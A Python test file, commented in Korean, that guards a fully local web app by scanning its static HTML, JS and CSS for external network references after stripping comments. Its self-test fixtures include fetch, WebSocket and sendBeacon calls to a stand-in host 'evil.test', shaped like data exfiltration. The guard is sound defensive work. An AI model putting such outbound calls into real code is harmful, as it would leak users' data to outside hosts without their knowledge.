"""완전 로컬 · 외부 통신 0 가드 — static 에셋에 외부 참조가 없어야 한다.

vendor/ 도 함께 스캔한다. three.js 소스 곳곳에 라이선스·문서용 URL이
(`// https://...`, `/** ... https://... */`) 널려 있지만 그건 주석이라
브라우저가 절대 요청하지 않는다 — 그래서 매칭 전에 주석부터 지운다
(`//` 라인주석·`/* */` 블록주석·HTML `<!-- -->`, 문자열 리터럴은 보존).
그 다음에야 실제로 네트워크 요청을 일으키는 참조 문맥
(src=/href=/from/import()/fetch()/url()/new URL()/new Worker()/
new WebSocket()·WebSocket()/navigator.sendBeacon()/importScripts())의
외부 URL(https/http/wss/ws/프로토콜상대 `//host.tld/...`)만 잡는다.
"""
import re
from pathlib import Path

_STATIC = Path(__file__).resolve().parents[2] / "seg_and_mesh" / "web" / "static"

# ---- 1) 주석 제거 전처리 ---------------------------------------------------
# 문자열 리터럴을 먼저 인식해 보존해야 한다. 안 그러면 'https://x' 안의
# "//"를 라인주석 시작으로 오인해서 매칭 대상 자체를 지워버린다.
_JS_TOKEN = re.compile(
    r'"(?:\\.|[^"\\])*"'
    r"|'(?:\\.|[^'\\])*'"
    r"|`(?:\\.|[^`\\])*`"
    r"|/\*.*?\*/"
    r"|//[^\n]*",
    re.DOTALL,
)
_BLOCK_COMMENT = re.compile(r"/\*.*?\*/", re.DOTALL)
_HTML_COMMENT = re.compile(r"<!--.*?-->", re.DOTALL)


def _blank(s: str) -> str:
    """길이(줄바꿈 포함 위치)는 보존한 채 내용만 지운다 — 오프셋이 안 틀어지게."""
    return re.sub(r"[^\n]", " ", s)


def _strip_comments(text: str, suffix: str) -> str:
    if suffix == ".js":
        out, pos = [], 0
        for m in _JS_TOKEN.finditer(text):
            out.append(text[pos:m.start()])
            token = m.group(0)
            # 주석 토큰(// 또는 /*)만 지우고 문자열 토큰은 그대로 둔다.
            out.append(_blank(token) if token.startswith("/") else token)
            pos = m.end()
        out.append(text[pos:])
        return "".join(out)
    if suffix == ".css":
        return _BLOCK_COMMENT.sub(lambda m: _blank(m.group(0)), text)
    if suffix == ".html":
        return _HTML_COMMENT.sub(lambda m: _blank(m.group(0)), text)
    return text


# ---- 2) 참조 문맥의 외부 URL 매처 ------------------------------------------
_SCHEME_URL = r"(?:https?|wss?)://[^\s'\"`)]*"
# 프로토콜상대 //host.tld/... — 점 있는 도메인꼴만, 상대경로 //api 같은
# 자기 자신 경유가 아니라 실제 외부 호스트일 때만 걸리게 한다.
_PROTO_RELATIVE_URL = r"//[A-Za-z0-9](?:[A-Za-z0-9-]*\.)+[A-Za-z]{2,}[^\s'\"`)]*"
_URL = rf"(?:{_SCHEME_URL}|{_PROTO_RELATIVE_URL})"

_EXTERNAL_REF = re.compile(
    rf"""(?:src|href)\s*=\s*['"]{_URL}"""
    rf"""|from\s+['"`]{_URL}"""
    rf"""|import\s*\(\s*['"`]{_URL}"""
    rf"""|fetch\(\s*['"`]{_URL}"""
    rf"""|url\(\s*['"]?{_URL}"""
    rf"""|new\s+URL\(\s*['"`]{_URL}"""
    rf"""|new\s+Worker\(\s*['"`]{_URL}"""
    rf"""|(?:new\s+)?WebSocket\(\s*['"`]{_URL}"""
    rf"""|navigator\.sendBeacon\(\s*['"`]{_URL}"""
    rf"""|importScripts\(\s*['"`]{_URL}""",
    re.IGNORECASE,
)


def find_external_refs(text: str, suffix: str) -> list:
    """두 테스트가 공유하는 유일한 매칭 로직 — 패턴은 여기 한 곳에만 둔다."""
    return list(_EXTERNAL_REF.finditer(_strip_comments(text, suffix)))


def test_no_external_references_in_own_assets():
    offenders = []
    for p in _STATIC.rglob("*"):
        if not p.is_file() or p.suffix not in (".html", ".js", ".css"):
            continue
        rel = p.relative_to(_STATIC)
        text = p.read_text(encoding="utf-8", errors="ignore")
        stripped = _strip_comments(text, p.suffix)
        for m in _EXTERNAL_REF.finditer(stripped):
            snippet = stripped[max(0, m.start() - 20):m.start() + 40]
            offenders.append(f"{rel}: …{snippet}…")
    assert not offenders, "외부 참조 발견:\n" + "\n".join(offenders)


# ---- 3) 실효성 증명 — 매처가 실제로 leak을 잡는지 -------------------------
_KNOWN_BAD = [
    ('<script src="https://cdn.jsdelivr.net/x.js"></script>', ".html"),
    ('<link href="//fonts.gstatic.com/x">', ".html"),
    ("import x from 'https://esm.sh/three'", ".js"),
    ("fetch(`https://evil.test/a`)", ".js"),
    ('new WebSocket("wss://evil.test")', ".js"),
    ('navigator.sendBeacon("https://evil.test", d)', ".js"),
]

_KNOWN_GOOD = [
    ("import * as THREE from '/static/vendor/three.module.js'", ".js"),
    ("fetch('/api/jobs')", ".js"),
    ("url(#clip)", ".css"),
]


def test_matcher_catches_known_leak_shapes():
    for text, suffix in _KNOWN_BAD:
        assert find_external_refs(text, suffix), f"놓침(false negative): {text!r}"
    for text, suffix in _KNOWN_GOOD:
        assert not find_external_refs(text, suffix), f"오탐(false positive): {text!r}"
    # 참조 문맥(fetch(...)) 안이라도 JS 라인주석 안이면 브라우저가 절대
    # 실행하지 않으므로 걸리지 않는다 — 주석 스트립 전처리가 하는 일이고,
    # 이건 우연이 아니라 설계다(문맥 정규식을 억지로 비틀지 않는다).
    commented = "// see https://example.com for docs"
    assert not find_external_refs(commented, ".js"), (
        "주석 안 URL이 걸림 — 주석 스트립 전처리가 깨졌을 수 있다"
    )
